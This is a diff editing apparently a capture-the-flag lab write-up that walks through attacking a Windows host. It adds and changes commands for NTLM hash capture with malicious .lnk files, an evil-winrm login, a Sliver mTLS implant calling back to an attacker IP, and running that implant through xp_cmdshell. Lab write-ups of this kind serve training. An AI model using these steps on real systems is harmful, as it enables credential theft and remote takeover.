@@ -67,7 +67,7 @@ With write access to a share, we can plant a malicious `.lnk` file. When a user 
 ### Step 1 — Generate the malicious files
 
 ```bash
-ntlm_theft.py --generate modern --server 10.1.115.168 --filename "meetingXYZ"
+ntlm_theft.py --verbose --generate modern --server 10.1.115.168 --filename "meetingXYZ"
 ```
 
 This creates several file types. The `.lnk` is the most reliable for "browse to folder" capture.
@@ -161,6 +161,12 @@ evil-winrm -i 10.1.145.243 -u 'alice.wonderland' -p 'NewPass123!'
 hack\alice.wonderland
 ```
 
+User flag is on the desktop:
+
+```bash
+*Evil-WinRM* PS C:\users\alice.wonderland\desktop> type user.txt
+```
+
 Check privileges — nothing exploitable directly:
 
 ```
@@ -206,7 +212,7 @@ sliver-server
 ### Step 2 — Generate an mTLS implant
 
 ```bash
-[server] sliver > generate --mtls 10.200.59.205:443 /home/jhaxx/CTFs/HackSmarter/ShareThePain/files
+[server] sliver > generate --mtls 10.200.59.205:443 --save /home/jhaxx/CTFs/HackSmarter/ShareThePain/files
 ```
 
 Output: `MAGNIFICENT_POLISH.exe`
@@ -278,7 +284,13 @@ SeImpersonatePrivilege    Impersonate a client after authentication    Enabled
 
 The `SeImpersonatePrivilege` belongs to `NT Service\MSSQL$SQLEXPRESS`, not `alice.wonderland`. We need to run GodPotato from that context.
 
-Copy the implant to `C:\Temp\` first (accessible by the service account), then execute it via xp_cmdshell:
+Copy the implant to `C:\Temp\` first (accessible by the service account). Do this from the `alice.wonderland` Evil-WinRM session:
+
+```bash
+*Evil-WinRM* PS C:\users\alice.wonderland\desktop> copy MAGNIFICENT_POLISH.exe C:\Temp\MAGNIFICENT_POLISH.exe
+```
+
+Then execute it via xp_cmdshell:
 
 ```sql
 SQL> xp_cmdshell 'C:\Temp\MAGNIFICENT_POLISH.exe'
